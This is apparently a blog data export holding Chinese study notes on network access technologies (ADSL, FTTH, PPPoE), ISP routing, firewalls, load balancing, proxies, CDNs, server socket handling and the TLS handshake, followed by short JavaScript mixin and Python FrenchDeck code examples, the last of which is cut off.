由于电话线传递的是多频合成的信号，其中只有和噪声频率相近的频段会受到噪声的影响，其余频段不受影响，因此最终接收方收到的可用信号变少了。由于在通电初始化时会检测可用频段，因此当出现噪声时，它不会像网线一样出现信号丢失，而是可用频段变少，传输速度下降而已； 通过 DSLAM 到达 BASDSLAM：DSL Access Multiplexer，数字用户线路接入复用设备；相当于多路 Modem 集成器，可以同时处理多个用户端 Modem 发过来的信号；理论上电话局也可以为每个用户配备一个 Modem，但显然这样需要大量的空间来放置 Modem；使用 DSLAM 就可以节省空间了； 家用 Modem 有一个以太网接口，用来连接用户家里的路由器，而电信局的 DSLAM 一般不使用以太网接口，因为它不跟电信局路由器直接连接，而是使用 ATM 接口，先跟 BAS 设备连接，之后 BAS 设备再跟路由器连接； BAS 是一台包转发设备（一种特定类型的专用路由器），它的职责是将 ATM 信元还原成原始的包，然后去掉 MAC 头部和 PPPoE 头部，为余下的 PPP 头部及其主体数据添加隧道协议的专用头部（例如 L2TP 协议），发给后面的隧道专用路由器； 光纤接入网（FTTH）光纤的基本知识 FTTH：Fiber To The Home，或许可以翻译为光纤入户； ADSL 在电话中上复合多个不同的频率的电信号来传输数据，光纤则简单得多，它使用明暗两种光线来表示 0 和 1； 单模与多模光本质上也是一种电磁波，因此光之间也会相互干扰；从光源射入光纤的光线有很多束，光束在被反射后，会出现相位的改变，而相位不同的光线会相互抵销；因此，只有特定入射角的光束能够在光纤中顺利向前传播，其他光束则因彼此相互干扰而抵销了； 光纤分单模和多模，其区别在于单模光纤的直径较细，因此只有最小入射角的光线，才能够保持相位一致并在光纤中传播；多模光纤由于直径较粗，存在多个满足相位一致的入射角光束，可以有多条光线在光纤中传播，因此接收设备对光敏元件的要求比较低，可以降低成本； 但它带来了另外一个问题，随着反射角度的变大，光线在光纤中反射的次数就会增多，传输距离变长，传输用时变多，因此和反射角度小的光线有到达时间差。如果时间差足够大，就会造成信号失真，因此，多模光纤的传输距离上限较小一些； 通过光纤分路来降低成本FTTH 架构和 ADSL 差不多，只是 ADSL 的 Modem 在 FTTH 中被换成了光纤收发器，它的职责就是将数据转在光信号发送出去。为了避免上行光信号和下行光信号产生互相干扰，上行和下行会使用不同波长的光线来传输数据，并使用棱镜分离原理获取所需的信号； 除了光纤收发器外，还有一种成本更低的做法，它的原理是上行的时候使用排队机制。用户端使用 ONU 设备，电信局端使用 OLT 使用；OLT 会给接入的多个用户信号进行排队，然后指示 ONU 设备按分配到队列序号发送光信号，这样多台客户端 ONU 设备发送的信号就不会出现冲突。当服务器返回响应时，OLT 会给数据包添加用户端编号，并广播到所有 ONU 设备上。ONU 检查收到的数据包，如果编号匹配，就接受；如果不匹配，就丢弃（有点像集线器和网卡的配合）； 不管 FTTH 使用直连还是分路的方式，都可以使用 PPPoE 来传输数据包； 接入网中使用的 PPP 和隧道用户认证和配置下发多数 ADSL 使用 PPPoE 协议来完成认证和配置下发（例如分配公共 IP 地址）的工作。传统的 PPP 拨号流程如下： RADIUS：Remote Access Dial-In User Service，拨号用户远程登录服务； LCP：Link Control Protocol，连接控制协议 PAP：PPP Authentication Protocol，PPP 认证协议； IPCP：Internet Protocol Control Protocol； 在以太网上传输 PPP 消息由于 ADSL 或 FTTH 线路是由 ISP 提供并直接连接 BAS 端口，因此理论上并不需要用户+密码的登录动作。但为了方便管理用户，多数运营商会使用 PPPoE 协议进行用户认证，这样有两个好处： 用户可以输入不同的用户名和密码，在不同的运营商之间进行切换； 运营商可以根据用户名，统计用户的流量； 在拨号上网的时代，使用专线传输，因此 PPP 协议可以使用 HDLC 协议作为容器。但到了非专线的 ADSL 和 FFTH 的时代，PPP 协议无法和以太网兼容，因此需要做一些改进，新的协议标准即为 PPPoE，Point to Point Protocol over Ethernet. ADSL Modem 在收到路由器发过来的以太网数据包后，需要先将其转成 ATM 信元，之后再转成电信号，然后传送出去，到达电信局的 DSLAM； FTTH 光纤收发器在收到路由器的以太网数据包后，无须转 ATM 信元，而是直接转成光信号，然后传送出去，到达电信局的多路光纤收发器； 通过隧道将网络包发送给运营商BAS 在收到 PPPoE 数据包后，进行解析，去掉 MAC 头部和 PPPoE 头部，从中取出 PPP 消息体，进行认证； 所谓的隧道，其实只是一种抽象。它表示通过建立某种形式的连接，将数据包从一头原封不动的传输到另一头。TCP&#x2F;IP 栈即是一种隧道方案，另外还可以其他封装方案； 接入网的整体工作过程 用户在接入互联网的路由器上面配置 ISP 运营商提供的用户名和密码； 路由器基于 PPPoE 协议，广播一条消息，查询 BAS 的 MAC 地址（有点像 ARP 的 MAC 寻址）； BAS 返回消息，告知路由器自己的 MAC 地址； 路由器得到 BAS 的 MAC 地址，使用 CHAP 或 PAP ，将用户名和密码发送给 BAS； BAS 收到用户名和密码，进行校验，如果密码正确，使用 IPCP 将配置信息（公有 IP 地址、DNS 服务器 IP 地址和默认网关的 IP 地址等）发送给路由器； 路由器收到配置信息，更新自身的配置参数； 客户端开始发送 TCP&#x2F;IP 数据包； 路由器为数据包添加 PPP 头部、PPPoE 头部、MAC 头部，由 Modem 转成电信号，发出给 DSLAM； DSLAM 将电信号还原成 PPPoE 数据包，转给 BAS； BAS 去掉数据包的 PPPoE 头部，得到 PPP 包，通过隧道发给运营商内部的路由器； 好奇客户端在完成 PPPoE 拨号连接后，后续的包是否需要携带用户名密码？还是携带会话 ID 即可？理论上首次登录时，运营商的 BAS 路由器应该会与认证服务器（存储用户信息）通信，验证用户名和密码是否正确；如果正确，理论上 BAS 应该在本地生成会话，并将会话 ID 下发给客户端即可；这样后续每次收到客户端的数据包，只需检查其中的 PPPoE 头部是否包含有效的会话 ID 即可，无需再次连接认证服务器进行验证； 不分配 IP 地址的无编号端口假设用户家里的接入路由器和运营商的 BAS 路由器是一对一连接的，那么包只有一条传输线路，肯定会到达 BAS 路由器，理论上完全没有必要为数据包添加 PPPoE 头部，而且也不需要为用户的接入路由器分配公有 IP 地址。这种不分配 IP 地址的方式称为无编号端口； 互联网接入路由器将私有地址转换成公有地址当使用路由器接入互联网时，BAS 会将公有地址分配给路由器。而位于路由器背后的局域网中的计算机，则只拥有路由器分配的私有地址。因此，当路由器收到内部局域网中的计算机的数据包时，需要做地址转换的动作，即将数据包中的私有 IP 地址转换成公网 IP 地址； 如果没有使用路由器，而是让计算机直连到 ADSL Modem 或者光纤收发器上面，那么计算机就会直接拥有公网 IP 地址； 除 PPPoE 以外的其他方式除了 PPPoE 外，还有一些其他连接方式，例如 PPPoA；PPPoA 和 PPPoE 的区别在于不给 PPP 消息添加 MAC 和 PPPoE 头部，而是直接将 PPP 消息转换成 ATM 信元 直接发送出去。PPPoE 之所以要添加 MAC 头部，是因为这样可以遵守以太网协议，Modem 可以充当一条以太网直接，和路由器用网线连接。当 PPPoA 不使用 MAC 头部时，就意味着 Modem 和路由器之间不可以使用网线连接，而是需要集成在一起； 最近几年国内运营商提供的 Modem 好像都是集成路由功能的，但里面的路由功能很弱鸡，所以大部分用户又不得不再自行购买一台更高性能的路由器； 集成在一起会减少一些灵活性的损失，例如更换设备时，需要整套更换，而不能只更新其中的一部分。但好处是少了一些头部后，数据包可容纳的数据量变多了，MTU 比较大，间接提高了传输速度； 另外还可以不使用 PPP，而是使用 DHCP 的方式给用户的路由器下发配置信息，这样就无须用户填写用户名和密码并对其进行验证；由于免去了 PPP 头部，还可以间接增加 MTU； 虽然 DHCP 也使用 ADSL Modem，但这个 Modem 的作用有所不同，它无须将数据转成信元，而转成 ADSL 信号发直接送出去； DHCP：Dynamic Host Configuratin Protocol，动态主机配置协议；路由器可以借助该协议，将网络配置信息告知主机，这样主机就可以通过路由器接入互联网； 网络运营商的内部POP 和 NOC互联网上面的内容，不管是内容访问方，还是内容提供方，他们都需要依赖运营商来实现对接；运营商跟使用者之间使用 POP 设备进行连接；从 ADSL、FTTH 发出的信号，最终会到达 POP 设备，然后进入互联网； POP：Point of Presense，互联网接入点，即运营商暴露给使用者的路由器； NOC：Network Operation Center，网络运行中心，即运营商内部对接多个 POP 设备的中心设备。 POP 设备有很多种类型，具体使用哪种类型，取决于运营商使用哪种线路和上下游进行对接； POP 中连接用户端的路由器需要配备很多端口，以便可以和很多用户同时对接；由于 POP 到用户端的线路速率，因此相对于接骨干网的路由器，接入用户端的路由器的性能要求会低一些；而 NOC 设备由于要同时处理很多 POP 设备的数据，因此它的性能要求很高，其数据吞吐能力是普通 POP 设备的 3-4 个数量级； 室外通信线路的网络包家庭或公司内部的网络连接，由于数据量较小，因此一般使用双绞线就足够了；但对于运营商来说，网线不够用，一般需要使用光纤来传输数据； 在室外铺设光纤的费用是很高的，只有拥有足够多客户的公司才能够承担。对于小运营商来说，更合理的方案是向大运营商租借线路的通信能力； 跨越运营商的网络包运营商之间的连接当用户的数据包到达 POP 路由器之后，如果目的地服务器刚好也是使用同一家运营商，那么就好办了。POP 只需查询自己的路由表，即可知道应该将数据包转发给哪台内部的 POP 路由器或者 NOC 路由器； 路由器之间会相互交换路由信息，从而自动更新自身的路由表； 如果目的地服务器属于另外一家运营商管理，那也没有问题。因为运营商之间也是用路由器相互连接的，因此彼此也拥有对方的路由信息，从而可以查询到转发目标； 运营商之间的路由信息交换分配给运营商的 IP 地址不是单个，而是整段的。当运营商在自己的路由器中配置了该段 IP 地址后，该路由器就可以使用 BGP 协议，将该信息发给相连接的其他运营商路由器，同时对方路由器也会发过来它负责的 IP 段； BGP：Border Gateway Protocol，边界网关协议； 有两种路由交换方案： 转接：A 不但发送自己的子网，还发送自己知道的互联网上所有的路由信息；这种方案的好处是被告知者 B 可以知道 A 背后还有谁，有些包可以通过 A 作为中介到达 A 背后的运营商； 对等：A 仅发送自己的子网；被告知者 B 只会将属于 A 子网的数据包发给 A，不属于 A 的就不会发了； 与公司网络中自动更新路由表机制的区别运营商之间的路由器，跟普通公司内部的路由器在本质上并没有什么区别。但是由于运营商之间存在线路费用的关系，因此在制定和交换路由规则上面，需要有所考量，不能像普通路由那样使用最短路径； 假设某个运营商的线路对外是收费的，那么他就会在路由规则中设置只转发交过费用的运营商的数据包，同时拒收那些未交费的运营商的数据包；另外，由于不同运营商的收费标准不同，因此在选择路由路径时，会设置一定的优先级，以降低成本； 保证用户能够访问互联网中任意一台机器，是运营商的基本职责。虽然出于成本考量，不一定选择最短路径，但终究是可达的； IX 的必要性运营商之间可以使用专线实现一对一的连接，但如果运营商很多，这种一对一的专线方案就显得成本太高了，更合适的方案是引入一个中心设备，各家运营商只需连接到该中心设备，数据包通过中心设备统一转发即可 IX：Internet Exchange，互联网交换中心； 由于 IX 同时对接多家运营商，因此其数据吞吐量非常大，有些甚至高达 200Gbit 每秒； 运营如何通过 IX 互相连接IX 本质上是一台交换机，与普通交换机的区别在于它的端口特别多，而且性能非常好（目前主流是使用 10Gbit&#x2F;s 的光纤端口）； 服务器端的局域网中有什么玄机Web 服务器的部署地点在公司里部署 Web 服务器 Web 服务器上面通常会安装很多软件，如果某个软件存在安全漏洞，就会导致服务器受到攻击，但其实大部分服务器上的软件并不对外提供服务；因此，通过引入防火墙，只允许访问特定软件的数据包通过，这样就可以避免服务器受到某个软件漏洞的影响； 目前仅靠防火墙已经不够用了，还需要配合反病毒软件、非法入侵检测软件、访问隔离机制等多套方案，才能有效提高安全性； 将 Web 服务器部署在数据中心由于数据中心离 IX 很近，因此可以让服务器获得更快的访问速度。同时由于数据中心通常还提供各种增值服务，因此一般也更加安全； 防火墙的结构和原理主流的包过滤方式防火墙的作用是只允许满足条件的流量通过，实现这个目标有很多种方案，但简单和低成本的方案是使用包过滤的方式； 如何设置包过滤规则由于数据包的头部包含一些关键的信息，因此可以基于这些头部信息制作相应的规则来实现包过滤； 上图的例子中，通过加入 TCP 包的控制位规则，实现 Web 服务器无法发起对互联网的访问，而只能响应客户端的请求； 通过端口号限定应用程序通过在规则中增加端口号，就可以实现只允许特定应用程序被外部访问；因为端口号映射着绑定该端口号的应用程序； 通过控制位判断连接方向TCP 头部中的控制位可以用来判断包的方向，因为在建立 TCP 连接时，发起的第一个数据包中的控制位为 SYN&#x3D;1 和 ACK&#x3D;0，后续的其他包的控制位都不再是这个组合。因此通过限制该组合的出现，就可以阻止建立 TCP 连接； 控制位只能适用于 TCP 连接，而其他连接协议（如 UDP）则不适用，因为 UDP 头部都没有这些控制位；这个时候要么妥协，要么需要增加其他防火墙方案，而不能只使用包过滤机制； 从公司内网访问公开区域的规则仅在发送方的 IP 地址为公司内网的 IP 地址时，才允许通过； 想到了访问后台时，可以临时添加 IP 地址来实现访问；先在内网中设立一个专用的后台程序来暴露接口。由于该程序处于内网，因此可以访问主程序的敏感接口；然后只允许特定 IP 访问该后台程序； 通常来说，内网的计算机分配的是私有 IP 地址，当访问外网时，路由器需要对其作地址转换。但内网之间的访问，则不需要地址转换，此时可以在路由器中配置相应的规则，让内网中的计算机对公开区域的访问，仍然使用私有地址； 从外部无法访问公司内网如果路由器没有地址转换的映射记录，当收到外网发进来的包时，由于不知道应该转发给哪台内网设备，路由器默认会丢弃该数据包； 通过防火墙使用防火墙软件时，可考虑开启包丢弃日志，这样可以分析入侵者的攻击方法；路由器由于内置存储很小，一般不适合开启日志功能； 防火墙无法抵御的攻击服务器程序本身的 BUG 引发的安全漏洞，是无法使用包过滤来规避的。常规的方法是增加部署检查包内容的软件或硬件；但这种方法的效力也是有限，因为某个包是否安全，是由服务器程序本身是否存在 BUG 来决定的，而这种 BUG 在早期是未知的，因此包检查软件也难以判断该数据包是否安全； 通过将请求平均分配给多台服务器来平均负载性能不足时需要负载均衡负载均衡可以有多种方案，最简单的方案是使用 DNS；在设置 DNS 解析时，新增多条相同域名的解析记录，每一条对应一个不同的 IP 地址；这样每次查询 DNS 时，DNS 服务器都会返回所有地址，但不同的地址顺序； 虽然 DNS 机制最简单，但是它也有一些缺点，例如： 当某台服务器宕机时，DNS 服务器无法知晓，仍然会给客户端返回宕机的服务器 IP 地址；除非客户端在发现第一个地址无效时，会自动访问第二个 IP 地址（多数浏览器已经实现该功能）； 当多台服务器时，如果用户的某个会话信息存储在其中一台服务器上面，之后用户访问另外一台服务器时，会导致会话丢失； 使用负载均衡器分配访问负载均衡的另外一种方案是使用专门的负载均衡器；DNS 解析指向该负载均衡器，当客户端访问负载均衡器时，会负载均衡器判断应该将包转发给哪台服务器； 负载均衡器会根据服务器当前的负载情况来转发包，有多种判断办法，例如： 定期查询服务器的 CPU 和内存使用情况； 根据服务器的性能参数按比例转发； 会话亲和性； 如果需要让负载均衡器将某个客户端请求固定转发到特定的机器上面，一般会使用 HTTP 的 cookie 字段作为判断；其原理很简单，当某个客户端首次访问时，负载均衡器为其分配一个唯一的 cookie 值，并记录映射的服务器；之后客户端的请求都需要携带该 cookie 值，这样负载均衡器就可以通过查询映射表，将请求转发给固定的服务器； 使用缓存服务器分担负载如何使用缓存服务器负载均衡可以有两种思路，这种思路可以单独使用，也可以组合使用： 使用多台功能相同的服务器：每台服务器分担的请求变少； 使用多台功能不同的服务器：每台服务器分担的工作内容变少 缓存服务器通过更新时间管理内容缓存服务器需要前置在 Web 服务器之前先处理请求，如果没有负载均衡器，那么缓存服务器需要直接注册到 DNS 解析记录中； 当客户端首次访问某个资源时，缓存服务器没有命中缓存，会直接将请求转给 Web 服务器，之后缓存 Web 服务器返回的结果；当客户端下次再访问相同资源时，缓存服务器在转发请求时，会在头部增加 If-Modified-Since 字段，用来沟通该资源是否发生了变更； 最原始的代理–正向代理缓存服务器的方案最早其实是部署在客户端的（公司），而不像现在部署在服务端。当时客户端的缓存服务器是为了实现防火墙，然后在此过程中发现还可以顺便充当缓存服务器，因为当时的网速很慢，因此使用缓存服务器可以有效提高访问速度；另外公司还可以利用该机制，控制员工可访问的网站列表，避免访问危险的网站； 后来由于出现了多种多样的代理方案，不同方案之间为了相互区分，因此才有了正向代理（forward proxy）、反向代理（reverse proxy）之类的名称； 当在浏览器中开启代理功能时，浏览器发送出去的请求会有所不同，主要区别如下： 没有代理 请求发往目标网站所在的服务器； HTTP 报文的 URI 只有路径，没有域名； 有代理 请求发往代理服务器； HTTP 报文的 URI 包含完整的域名和路径； 正向代理的改良版–反向代理由于使用正向代理要求用户修改浏览器配置，比较麻烦而且容易出错导致浏览器无法正常工作。因此改进的办法是将缓存服务器部署到服务端，将 HTTP 报文中的 URI 和目标 Web 服务器进行关联（因为 HTTP 1.0 版本没有 Host 字段），这样就可以得到完整的网站，从而能够转发任意消息。为了跟传统的前端代理以示区别，这种方式称为反向代理（reverse proxy）； 透明代理正向代理需要配置浏览器，反向代理需要配置服务器，二者才能正常工作；还有一种方案是根据数据包中 IP 头部来判断转发目标，这样就既不需要配置服务端，也无须配置浏览器，同时还获得了各自的优点； 由于透明代理作为中间人在工作，因此它必须知道最终访问的目标 IP 地址，而不能让自己像反向代理一样成为被访问目标，否则数据包中的最终目标 IP 地址就变成它自己了（貌似可以通过域名再次查询出来？）；为了实现透明代理的功能，透明代理需要放置于数据包发出方和接收方之间的传输线路上面； 内容分发服务利用内容分发服务分担负载如果将缓存服务器放在服务端，那么它可以减轻后端 Web 服务器的负担，提高后端这一段的访问速度，但由于所有的用户流量仍然会到达缓存服务器，因此它无法避免网络传输线路上存在的堵塞； 如果缓存服务器由用户自己部署在客户端，那么它可以很好的避免网络上的堵塞，但是 Web 服务器无法控制客户端缓存服务器中的内容； 第三种方案就是将缓存服务器放在互联网的边缘（即客户端所在的运营商机房），这样客户端在进入堵塞区域之前，能够先到达运营商机房内部的缓存服务器，既提高了客户端的访问速度，也减轻了服务端的负担，同时服务端也能够控制缓存服务器上面的内容； 单个 Web 服务器的运营者跟运营商签合同的话，费用成本很高，因此出现了专门的第三方，他们和主要的几家运营商签合同，之后再租借给单个的 Web 服务器运营者，实现三赢；这种模式称为内容分发服务； 如何找到最近的缓存服务器 寻找最近的缓存服务器有多种方案，其中一种是使用 DNS；大致原理如下： Web 服务器注册的 DNS 服务器先收集好各缓存服务器的路由信息； 当收到客户端发出的 DNS 解析请求时，基于上一步的路由信息，判断客户端到哪台缓存服务器的路径最短，并返回结果； 通过重定向服务器分配访问目标另外一种寻找最近缓存服务器的方法是添加重定向服务器，并将其添加到 DNS 解析记录中；这样当客户端发起请求时，数据包先到达重定向服务器，之后重定向服务器基于提前收集好的路由信息，判断最近的缓存缓存器，并存储在 HTTP 响应头部中的 Location 字段。客户端在收到该响应后，会向 Location 中的缓存服务器地址，发起一个新的连接； 缓存的更新方法会影响性能缓存机制最早是被动式的，首次收到请求后，发现缓存中没有数据，因此向 Web 服务器请求资源；后续的请求则每次询问 Web 服务器资源是否变更，若没有变更，则返回缓存中的内容；这种被动式的缓存有两个缺点，一是首次访问较慢，二是后续的每次查询仍然会给 Web 服务器带来一定的负担； 更好的办法是使用主动式的缓存，它的原理是当 Web 服务器上面的内容有变更时，就通知缓存服务器更新。这种方法可以避免后续 Web 服务器收到大量关于资源是否变更的询问； 请求到达 Web 服务器，响应返回浏览器服务器概览客户端与服务器的区别客户端与服务器并没有本质上的区别，都是计算机，唯一的区别是服务器要先做好开门候客的动作（在没有客户端请求到达之前，需要先创建好套接字并进入待连接状态；而客户端只需要发起连接前，再临时创建套接字即可）；因为在 TCP 协议的设计中，必须有一方处于待连接的状态，连接才有可能建立； 虽然在本质上没有不同，但所使用的硬件型号一般有所区别，服务器的使用场景有两个关键特点，一个是并发量高，需要应付很多客户端的访问；二是需要长时期的稳定运行。为了满足这两种需求，一般服务器的 CPU 核数更多，但单核性能不高；内存更大，而且带校验机制，但内存性能较低；通常不配备显卡，网卡比较多，可拓展更多的硬盘，以满足存储需求； 服务器程序的结构服务端要应付多个客户端发起的连接请求，因此服务端会给每个请求创建一个单独的套接字；大概过程如下： 当服务端创建完第一个套接字后，先进入监听状态和等待连接的状态；之后如果有新的客户端连接请求到达，它就会复制一个套接字副本出来（使用新的文件描述符），并将客户端的控制信息填写到副本里面，而旧的套接字内容保持不变，并继续处于待连接状态，以便应付新的客户端请求；当有多个客户端同时连接服务端时，就会存在多个套接字副本，更有意思的是，它们都绑定到相同的端口号； 协议栈会维护一张套接字映射表，通过四项信息的组合，来识别接收到的数据包到底是属于哪个套接字，这四项信息分别是客户端IP+客户端端口+本机IP+本机端口；根据这四项信息，通过查找映射表，就知道当前的数据包是属于哪个套接字了； 而对于应用程序来说，是通过文件描述符来跟套接字打交道的；多个套接字副本，意味着有多个文件描述符；当某个文件描述符进入就绪状态后，它会发起一个中断，之后操作系统会通知应用程序，并将控制权转移给应用程序进行处理； 特别注意：套接字跟端口可以是多对一的关系，协议栈会维护一张映射表，根据数据包中的头部信息判断，该数据包隶属于哪个套接字负责；每个套接字中存储着不同的连接信息； 以前在学 《深入》和 C 语言时，由于 socket 初始化后，总是有一个 bind 的动作，误以为套接字和端口是一对一的关系，现在才发现其实不是；以前没有留意到 accept 动作会返回新的套接字，回头看了一下笔记，才发现当时写的是描述符，因此没有意识到 accept 返回的新描述符背后，其实是一个新的套接字； 服务器端的套接字和端口号服务端的应用程序大致可以划分为两个模块： 负责建立连接的模块，即下图的连接模块； 负责生成响应的模块，即下图的通信模块； 调用 accept 并不会马上返回新的套接字，在客户端的请求没有到达之前，它其实是进入阻塞的状态，要一直等到客户端的请求进来后，才会返回新套接字；该新套接字其实不是从头新建的，而是复制旧套接字并进行补充客户端连接信息后而来的； 当出现多个套接字对应同一个端口号时，为避免混乱，协议栈必须维护一张映射表，以便知悉哪个客户端请求对应的是哪个套接字； 服务器的接收操作网卡将接收到的信号转换成数字信息网卡收到电信号后： 先根据规范约定的波形判断出头部的位置， 从头部中读取到时钟周期 基于该时钟周期，从原始被发送方叠加过时期周期的电信号中，分离出原始信号； 将原始信号转换成 0 和 1 表示的数字信号； 根据规范，从数字信号末尾读取校验值； 计算解析后的数字信号的校验值，看是否跟收到的校验值一致； 若不一致，丢弃该数据包； 若一致，检查头部中的 MAC 值是否跟当前网卡的 MAC 值一致； 若不一致，丢弃该数据包； 若一致，将数字信号放到缓存中，触发中断事件，以便 CPU 介入，并将控制权转移给网卡驱动程序； 网卡驱动程序读取缓存中的数据，根据 MAC 头部判断使用何种协议；然后触发中断事件，以便 CPU 介入，并将控制权转给相应的协议栈进行处理； IP 模块的接收操作IP 模块收到数据包后的动作： 检查 IP 头部中的目标 IP 地址，判断该包是否发给自己； 若不是，则根据情况（是否开启转发功能）转发该数据包； 若是，检查是否分片；若有分，则等待所有分片到达后组装它们； 组装好后，检查头部中的协议号字段，看使用何种协议，并转交给相应的协议模块（如 TCP ）进行处理； TCP 模块如何处理连接包TCP 模块收到 IP 模块转交的数据后： 检查头部中的端口号字段，看有无套接字在监听该端口号； 若没有，发送一条 ICMP 消息给客户端告知错误（黑客可基于该条规则对端口号进行扫描，了解有哪些端口号处于监听状态）；如果有，继续往下； 检头部中的控制位 SYN，如果值为 1，表示这个一个尝试建立连接的控制包；复制一份当前监听访端口的套接字，写入客户端相关信息（如客户端的 IP 地址、端口号、窗口大小、序列起始值等）；然后生成包含己方连接信息的控制包，转交给 IP 模块处理发出去； TCP 模块如何处理数据包如果 TCP 头部中的控制位没有值，则说明当前包是一个数据包，而不是连接控制包，动作如下： 判断该数据包属于哪个套接字处理，判断办法基于接发双方的 IP 地址和端口号四项信息即可； 根据套接字中保存的信息，了解之前已收到第几个序列号的包，以及当前包的序号是否能够连上，以便后续可以将各个分包组装成完整的数据；若可连上，将数据放入缓冲区； 每隔一小段时间，发送 ACK 控制信息给客户端，告知某个序号以前的包已经收到了； 收到所有包后，触发中断事件，CPU 介入，通知应用程序来读取数据； TCP 模块的断开操作当收到完整的数据包之后，连接就可以断开了，断开动作可以由客户端发起，也可以由服务端发起； HTTP 1.0，规定由服务端发起； HTTP 1.1，规定由客户端发起； Web 服务器程序解释请求消息并作出响应将请求的 URI 转换为实现的文件名对于静态资源的访问，请求中的 URI 通常会映射到服务器上面某个目录中的某个文件， 只需提前在服务器程序中进行配置好可；文件名可以一一对应，也可以不一样，然后通过配置好的改写规则进行映射即可； 运行 CGI 程序对于动态资源的访问，一般 URI 会被映射给某个符合 CGI 标准的程序文件；当访问该 URI 时，就会委托操作系统运行相应的 CGI 程序文件，此时会将 HTTP 请求报文的内容作为参数传递给该 CGI 程序； 传统的 CGI 程序在运行结束后，会生成 HTML 格式的内容作为响应消息，现在则衍生出了很多种格式，例如 XML，JSON 等格式；之后将响应内容交给服务器模块发送给客户端，服务器模块不会修改内容，但有时会添加一些头部字段； Web 服务器的访问控制如果某些资源限制访问，当收到访问这些限制资源的请求时，需要验证用户的身份，以检查是否满足访问条件，常用的办法是使用用户名和密码，偶尔会使用客户端的 IP； 返回响应消息返回响应消息的过程跟发出消息的过程差不多，只是反过来而已； 浏览器接收响应消息并显示内容通过响应的数据类型判断其中的内容浏览器在收到服务器返回的消息后，需要先根据头部的 content-type 字段判断一下消息的类型，以便能够正常显示它们；常见的消息类型有 text、image、audio、video、application、multipart（复合类型）等；例如： Content-Type: text&#x2F;html; charset&#x3D;utf-8，text 表示主类型为文本，斜杠右边的 html 表示子类型，charset 表示编码方式； 另外为了提高传输速度，数据有可能被压缩了，此时可以根据头部的 Content-Encoding 字段了解使用的压缩方式，然后进行解压； 浏览器显示网页内容有些数据类型如 HTML、图片是浏览器能够直接显示的，有些浏览器显示不了的数据类型，就会调用相应的应用程序来处理数据； 其他TSL 连接过程单向认证 客户端：发起问候，告知服务端自己所支持的协议和加密套件，以及客户端生成的随机数； 服务端：发起问候，告知客户端自己的 SSL 公钥以及相应的签发机构，所支持的协议和加密套件，以及服务端生成的随机数； 客户端：用证书机构的公钥，验证服务端的 SSL 公钥是否和所访问的域名一致；若不一致，结束；若一致，下一步； 客户端：生成第二个随机数（称为 premaster secret），使用服务端的公钥加密后，发给服务端； 服务端：用私钥解密收到的数据，得到 premaster secret，加上之前双方各自生成的两个随机数，共三个随机数，使用加密套件生成会话密钥；使用会话密钥，加密“已完成”的消息，发给客户端，告知对方自己就绪； 客户端：同样使用三个随机数生成会话密钥，加密“已完成”的消息，发给服务端，告知对方自己就绪； 双方完成握手； 双向认证双向认证与单向认证的唯一不同点在于第4步，客户端在发送 premaster 时，还会同时附上自己的公钥证书，以及将之前双方的随机字符串使用自己的私钥进行加密并发送，这样服务端收到该公钥证书，使用 CA 可以进行验证；如果有问题，中断通信，握手失败；如果没问题，后续跟单向认证相同，即开始用自己的私钥解密得到 premaster，然后使用加密套件计算出会话密钥； 非对称密钥 使用 openssl 等工具，可以生成非对称密钥，即一把公钥和一把私钥，其中一把加密后的内容，可以由另外一把解密； 所谓的证书，是指使用权威 CA 机构的私钥，对公钥拥有者（例如域名）和公钥本身进行加密后，生成的内容；由于 CA 机构的公钥是公开的，因此任何人都可以使用 CA 机构的公钥对证书进行解密，解密后就可以验证其中的内容（公钥+公钥所有者的身份信息），例如域名是否为预期想访问的网站域名；如果是，说明该证书是有效的； 权威机构在受理证书申请时，需要验证申请人的身份信息，例如申请网站的域名证书时，就需要验证该域名是否真的被申请人持有；Let’s Encrypt 的方法是生成两个随机字符串，一个做为域名的访问路径，然后发起对该路径的访问，看访问结果是否为另外一个随机字符串；如果是，说明域名确实由申请者所拥有，因为申请者能够将字符串添加到访问路径和访问结果中；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"js多重继承","slug":"js 多重继承","date":"2017-11-12T08:46:48.000Z","updated":"2024-09-21T09:14:16.600Z","comments":true,"path":"2017/11/12/js 多重继承/","permalink":"http://example.com/2017/11/12/js%20%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF/","excerpt":"","text":"方法一：克隆一个A对象，再将 B 对象的属性混入，适用于 A&#x2F;B 的属性不冲突的场景；12345678910function mixInto(object, mixIn)&#123; forEachIn(mixIn, function(name, value)&#123; object[name] = value; &#125;);&#125;;var SmallDetailedItem = clone(DetailedItem);mixInto(SmallDetailedItem, SmallItem);var deadMouse = SmallDetailedItem.create(&quot;Fred the mouse&quot;, &quot;he is dead&quot;); 方法二：用 A 对象扩展一个子对象，再用 B 对象 扩展并覆盖子对象中的冲突属性；1234567891011121314151617181920212223242526272829var Monster = Item.extend(&#123; construct: function(name, dangerous)&#123; Item.construct.call(this, name); this.dangerous = dangerous; &#125;, kick: function()&#123; if (this.dangerous)&#123; alert(this.name + &quot; bites your head off&quot;); &#125; else&#123; alert(this.name + &quot; squeaks and runs away&quot;); &#125; &#125;&#125;);var DetailedMonster = DetailedItem.extend(&#123; construct: function(name, description, dangerous)&#123; DetailedItem.construct.call(this, name, dangerous); Monster.construct.call(this, name, dangerous); &#125;, kick: Monster.kick&#125;);var giantSloth = DetailedMonster.create( &quot;the giant sloth&quot;, &quot;it is quietly hanging from a tree, munching leaves&quot;, false); giantSloth.kick();","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"流畅的Python","slug":"流畅的Python","date":"2017-07-25T10:34:00.000Z","updated":"2024-09-21T10:12:54.733Z","comments":true,"path":"2017/07/25/流畅的Python/","permalink":"http://example.com/2017/07/25/%E6%B5%81%E7%95%85%E7%9A%84Python/","excerpt":"","text":"第1章 Python 数据结构一摞 Python 风格的纸牌123456789101112131415import collectionsCard = collections.namedtuple(&#x27;Card&#x27;, [&#x27;rank&#x27;, &#x27;suit&#x27;])class FrenchDeck: ranks = [str(n) for n in range(2, 11)] + list(&#x27;JQKA&#x27;) suits = &#x27;spades diamonds clubs hearts&#x27;.split() def __init__(self): self._cards = [Card(rank, suit) for suit in self.suits for rank in self.ranks] def __len__(self): return len(self._cards) def __getitem__(self, position): return 